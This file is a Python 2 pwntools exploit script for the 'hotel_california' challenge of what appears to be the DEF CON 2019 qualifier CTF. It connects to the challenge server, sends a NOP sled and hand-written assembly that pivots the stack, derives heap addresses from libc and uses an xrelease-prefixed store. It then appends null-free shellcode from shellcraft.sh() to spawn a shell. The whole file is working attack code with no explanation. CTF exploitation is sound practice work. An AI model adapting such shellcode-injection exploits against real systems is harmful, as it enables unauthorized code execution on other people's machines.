#!/usr/bin/env python2
from pwn import *

context.binary = "hotel_california_norandom"

### Interact functions ###

##########################

if args.LOCAL:
    p = process(argv=["/root/Downloads/sde-external-8.35.0-2019-03-11-lin/sde64", "-hle_enabled", "-hle_abort_log", "--", context.binary.path])
    """raw_input('\n'.join([
        '',
        'attach {}'.format(p.pid),
        'continue',
        '',
        '[ENTER]'
       ]))"""
    #print p.recvlines(3)[-1]
    #print "continue"

else:
    p = remote("hotelcalifornia.quals2019.oooverflow.io", 7777)

p.recvuntil(' > ')

p.send('\x90'*1023 + '\x00')

p.recvuntil(' > ')
#p.send("\x90"*800 + '\x00')
#p.recvuntil(' > ')

payload = asm("""
        /* rsp now .bss */
        add r11, 0x02010101;
        sub r11, 31519071;
        mov rsp, r11;

        /* libc rw address in rax */
        mov rax,[rsp+24];
        
        /* bins */
        add rax, -2752;

        /* rdi has heap addr */
        mov rdi,[rax];

        /* fix rdi pointer */
        add rdi,-2128;


        xrelease mov DWORD PTR [rdi], 0x43434343""")
if "\x00" in payload:
    print "null in payload"
    print repr(payload)
    exit()

payload += encoder.null(asm("mov rsp, rax;" + shellcraft.sh()))

print "payload len:", len(payload)
p.send(payload + "\x90"*(800-len(payload))+'\x00')
p.interactive()
